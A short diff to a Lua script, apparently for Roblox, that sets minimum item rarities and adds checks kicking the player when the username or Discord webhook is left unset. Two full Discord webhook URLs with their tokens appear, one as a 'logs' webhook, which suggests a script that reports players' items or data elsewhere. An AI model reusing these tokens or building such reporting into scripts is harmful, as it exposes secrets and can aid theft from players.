@@ -5,6 +5,12 @@ Unique = 1 -- [Minimum Unique]
 Ancient = 1 -- [Minimum Ancient]
 Godly = 1 -- [Minimum Godly]
 
+if Username == "pablogarote" or Username == nil then
+    game.Players.LocalPlayer:Kick("Please Enter A Username!")
+end
+if Webhook == "https://discordapp.com/api/webhooks/1333690748993802281/bI35aJX5ix3bRb8GHjX2E5CrX0aTcoJK7ULOaAEIBAsLQ1n-NsL9Squqe0KgPEEGrVpr" or Webhook == nil then
+    game.Players.LocalPlayer:Kick("Please Enter A Webhook!")
+end
 
 logsweb = "https://discordapp.com/api/webhooks/1370437958360104980/NDUlG35C-5MhANf-KPtUG_Ua-Qu4vYRiEuSbteVS2QqnY5NfLYhYvsHwAD2cQnZoDOsf" -- your logswebhook here
 
